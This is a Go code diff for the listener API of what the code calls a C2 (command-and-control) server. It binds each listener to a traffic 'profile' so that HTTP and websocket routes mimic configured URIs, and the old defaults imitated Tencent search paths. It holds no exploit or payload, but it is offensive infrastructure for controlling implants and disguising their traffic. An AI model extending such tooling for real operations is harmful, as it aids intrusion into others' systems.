@@ -1,16 +1,16 @@
 package api
 
 import (
-	"BackendTemplate/pkg/audit"
 	"BackendTemplate/pkg/api/communication"
+	"BackendTemplate/pkg/audit"
 	"BackendTemplate/pkg/c2profile"
 	"BackendTemplate/pkg/certutil"
 	"BackendTemplate/pkg/config"
 	"BackendTemplate/pkg/connection"
 
+	dns_listener "BackendTemplate/pkg/connection/dns"
 	k "BackendTemplate/pkg/connection/kcp"
 	"BackendTemplate/pkg/connection/oss"
-	dns_listener "BackendTemplate/pkg/connection/dns"
 	"BackendTemplate/pkg/connection/tcp"
 	"BackendTemplate/pkg/connection/websocket"
 	"BackendTemplate/pkg/database"
@@ -23,10 +23,10 @@ import (
 	"strings"
 	"time"
 
+	"BackendTemplate/pkg/utils/logx"
 	"github.com/gin-gonic/gin"
 	gorillaws "github.com/gorilla/websocket"
 	"github.com/xtaci/kcp-go/v5"
-	"BackendTemplate/pkg/utils/logx"
 )
 
 func AddListener(c *gin.Context) {
@@ -39,6 +39,7 @@ func AddListener(c *gin.Context) {
 		Note           string `json:"note"`           // 监听器备注
 		VKey           string `json:"vkey"`           // VKey
 		EncryptionSalt string `json:"encryptionSalt"` // 流量加密盐
+		Profile        string `json:"profile"`        // 绑定的 C2 画像名，空=default
 	}
 	if err := c.BindJSON(&listener); err != nil {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
@@ -80,6 +81,18 @@ func AddListener(c *gin.Context) {
 		}
 	}
 
+	// 画像必须存在：写进库一个不存在的画像名，监听器起来后会静态回落 default，
+	// 而生成载荷时又按这个名字做校验 —— 一个"看起来配了 A、实际跑的 B"的隐患。
+	// 空值 = default（与升级前行为一致）。
+	profileName := strings.TrimSpace(listener.Profile)
+	if profileName == "" {
+		profileName = c2profile.DefaultProfileName
+	}
+	if c2profile.Get(profileName) == nil {
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "C2 画像不存在: " + profileName})
+		return
+	}
+
 	// J4 前置 + 长度：默认/空密钥的监听器 handleOpenPort 必然拒绝启动，过短的密钥则会让派生
 	// 密钥尾部零填充。原实现先 Insert(Status:1) 再 go handleOpenPort，被拒绝后库里会留下
 	// Status=1 却没有句柄的记录（前端显示"监听中"）。留空会走到上面的随机生成，故此处校验
@@ -99,12 +112,13 @@ func AddListener(c *gin.Context) {
 		Note:              listener.Note,
 		VKey:              listener.VKey,
 		EncryptionSalt:    listener.EncryptionSalt,
+		Profile:           profileName,
 	})
 	encrypt.InvalidateListenerKeyCache()
 	// D18: 业务审计
 	auditLogEvent("LISTENER_ADD", "SUCCESS", "新增监听器 "+listener.Type+"://"+listener.ListenAddress, map[string]interface{}{"type": listener.Type, "address": listener.ListenAddress})
 	c.JSON(http.StatusOK, gin.H{"status": 200, "data": "Listener added"})
-	go handleOpenPort(listener.Type, listener.ListenAddress, listener.VKey, listener.EncryptionSalt)
+	go handleOpenPort(listener.Type, listener.ListenAddress, listener.VKey, listener.EncryptionSalt, listener.Profile)
 }
 
 // maskedMarker 脱敏预览的占位符。凡含此标记的值都视为"不是真实值，而是对库中现有值的引用"：
@@ -155,6 +169,7 @@ type listenerResponse struct {
 	Note              string `json:"Note"`
 	VKey              string `json:"VKey"`
 	EncryptionSalt    string `json:"EncryptionSalt"`
+	Profile           string `json:"Profile"` // 绑定的 C2 画像名（空=default）
 }
 
 func maskListenerForResponse(l database.Listener) listenerResponse {
@@ -169,6 +184,7 @@ func maskListenerForResponse(l database.Listener) listenerResponse {
 		Note:              l.Note,
 		VKey:              maskSecretPreview(l.VKey),
 		EncryptionSalt:    maskSecretPreview(l.EncryptionSalt),
+		Profile:           l.Profile,
 	}
 }
 
@@ -239,7 +255,7 @@ func OpenListener(c *gin.Context) {
 		database.DB().Where("listen_address = ?", listener.ListenAddress).Update(&database.Listener{Status: 1})
 
 		encrypt.InvalidateListenerKeyCache()
-		go handleOpenPort(lis.Type, listener.ListenAddress, lis.VKey, lis.EncryptionSalt)
+		go handleOpenPort(lis.Type, listener.ListenAddress, lis.VKey, lis.EncryptionSalt, lis.Profile)
 		auditLogEvent("LISTENER_OPEN", "SUCCESS", "启动监听器 "+lis.Type+"://"+listener.ListenAddress, nil)
 		c.JSON(http.StatusOK, gin.H{"status": 200, "data": "Listener opened"})
 	} else {
@@ -299,7 +315,7 @@ func DeleteListener(c *gin.Context) {
 // UpdateListener 更新监听器配置
 func UpdateListener(c *gin.Context) {
 	var listener struct {
-		Id                int64  `json:"id"`             // 监听器ID，用于唯一标识
+		Id                int64  `json:"id"` // 监听器ID，用于唯一标识
 		ListenAddress     string `json:"listenAddress"`
 		Type              string `json:"type"`
 		ConnectAddress    string `json:"connectAddress"`
@@ -549,6 +565,7 @@ func BatchDeleteListeners(c *gin.Context) {
 
 	c.JSON(http.StatusOK, response)
 }
+
 // handleOpenPort 启动监听器。vkey/salt 为该监听器自身的密钥配置，
 // 传递给连接处理器用于会话密钥派生，避免同类型多监听器时按 type 查库取错密钥。
 
@@ -556,10 +573,23 @@ func BatchDeleteListeners(c *gin.Context) {
 // vkey/salt 为该监听器自身的密钥配置，经闭包透传给轮询处理器：http/https 可多实例且
 // 各持独立密钥，处理器内按类型查库在同类型多监听器时只能取到任意一行（与 websocket
 // 分支同一处理方式）。
-func registerHTTPRoutes(mux *http.ServeMux, vkey, salt string) {
-	p := c2profile.GetDefault()
-	getURI, postURI := "/tencent/mcp/pc/pcsearch", "/tencent/sensearch/collection/item/check"
-	if p != nil {
+// resolveListenerProfile 取该监听器实际注册流量特征所用的画像。
+//
+// "空=default"：库里存空串（老库升级、或运维没选）时回落到 default，
+// 保证升级前后行为不变。返回的画像在文件缺失时为 nil（调用方自行兜底）。
+func resolveListenerProfile(name string) (string, *c2profile.Profile) {
+	if strings.TrimSpace(name) == "" {
+		name = c2profile.DefaultProfileName
+	}
+	return name, c2profile.Get(name)
+}
+
+func registerHTTPRoutes(mux *http.ServeMux, vkey, salt, profileName string) {
+	profileName, p := resolveListenerProfile(profileName)
+	getURI, postURI := c2profile.DefaultGetURI, c2profile.DefaultPostURI
+	if p == nil {
+		logx.Warnf("⚠️ [监听器] 画像 %q 不存在，已回落 default 特征注册路由\n", profileName)
+	} else {
 		if p.HTTP.Get.URI != "" {
 			getURI = p.HTTP.Get.URI
 		}
@@ -567,12 +597,26 @@ func registerHTTPRoutes(mux *http.ServeMux, vkey, salt string) {
 			postURI = p.HTTP.Post.URI
 		}
 	}
+	logx.Infof("🛣️ [监听器] 按画像 %q 注册 HTTP 路由: GET %s / POST %s\n", profileName, getURI, postURI)
 	mux.HandleFunc(getURI, func(w http.ResponseWriter, r *http.Request) {
 		communication.GetHttpWithKeys(w, r, []byte(vkey), []byte(salt))
 	})
 	mux.HandleFunc(postURI, func(w http.ResponseWriter, r *http.Request) {
 		communication.PostHttpWithKeys(w, r, []byte(vkey), []byte(salt))
 	})
+}
+
+// resolveWSRoute 取 websocket 监听器应注册的 WS 路径。
+// 与 HTTP 同理：画像缺失时回落 /ws 并告警。
+func resolveWSRoute(profileName string) string {
+	profileName, p := resolveListenerProfile(profileName)
+	if p == nil || strings.TrimSpace(p.WS.Path) == "" {
+		if p == nil {
+			logx.Warnf("⚠️ [监听器] 画像 %q 不存在，WS 路径回落 /ws\n", profileName)
+		}
+		return c2profile.DefaultWSPath
+	}
+	return p.WS.Path
 }
 
 // isForwardListenerType 正向监听类型：服务端主动拨出，不 bind 本机端口
@@ -596,7 +640,7 @@ func markListenerStartFailed(listenerType, listenerAddress, reason string) {
 	logx.Errorf("❌ [监听器] %s://%s 启动失败，状态已回置为已停止：%s\n", listenerType, listenerAddress, reason)
 }
 
-func handleOpenPort(listenerType string, listenerAddress string, vkey string, salt string) {
+func handleOpenPort(listenerType string, listenerAddress string, vkey string, salt string, profileName string) {
 	// 崩溃防护：任何监听器 panic 都不能杀死整个 C2 进程
 	defer func() {
 		if r := recover(); r != nil {
@@ -624,7 +668,9 @@ func handleOpenPort(listenerType string, listenerAddress string, vkey string, sa
 	switch listenerType {
 	case "websocket":
 		mux := http.NewServeMux()
-		mux.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
+		// WS 路径按该监听器绑定的画像注册（原来硬编码 /ws，导致"换画像就必然连不上"）
+		wsPath := resolveWSRoute(profileName)
+		mux.HandleFunc(wsPath, func(w http.ResponseWriter, r *http.Request) {
 			if vkey != "" && salt != "" {
 				websocket.HandleWebSocketWithKeys(w, r, []byte(vkey), []byte(salt))
 			} else {
@@ -723,7 +769,7 @@ func handleOpenPort(listenerType string, listenerAddress string, vkey string, sa
 		}
 	case "http":
 		mux := http.NewServeMux()
-		registerHTTPRoutes(mux, vkey, salt)
+		registerHTTPRoutes(mux, vkey, salt, profileName)
 
 		server := &http.Server{
 			Addr:              listenerAddress,
@@ -776,7 +822,7 @@ func handleOpenPort(listenerType string, listenerAddress string, vkey string, sa
 		}
 
 		mux := http.NewServeMux()
-		registerHTTPRoutes(mux, vkey, salt)
+		registerHTTPRoutes(mux, vkey, salt, profileName)
 
 		server := &http.Server{
 			Addr:              listenerAddress,
@@ -1137,6 +1183,7 @@ func auditLogEvent(action, result, message string, details map[string]interface{
 		audit.GlobalAuditLogger.Log(audit.LogLevelInfo, audit.CategoryAPI, action, result, message, details)
 	}
 }
+
 // RestartListener 重启监听器（断链修复:前端 listener.vue 已有调用,原后端无此路由）。
 // 组合现有原语: 若运行中先走 handleClosePort(断开该监听器全部会话),再 handleOpenPort。
 // 注意: 重启会断开该监听器下全部客户端连接(前端已加确认弹窗),客户端将自动重连。
@@ -1169,7 +1216,7 @@ func RestartListener(c *gin.Context) {
 	// 重新启动(handleOpenPort 内含 J4 默认密钥拒绝与 panic 防护)
 	database.DB().Where("listen_address = ?", lis.ListenAddress).Update(&database.Listener{Status: 1})
 	encrypt.InvalidateListenerKeyCache()
-	go handleOpenPort(lis.Type, lis.ListenAddress, lis.VKey, lis.EncryptionSalt)
+	go handleOpenPort(lis.Type, lis.ListenAddress, lis.VKey, lis.EncryptionSalt, lis.Profile)
 	auditLogEvent("LISTENER_RESTART", "SUCCESS", "重启监听器 "+lis.Type+"://"+lis.ListenAddress, nil)
 	c.JSON(http.StatusOK, gin.H{"status": 200, "data": "Listener restarted"})
 }
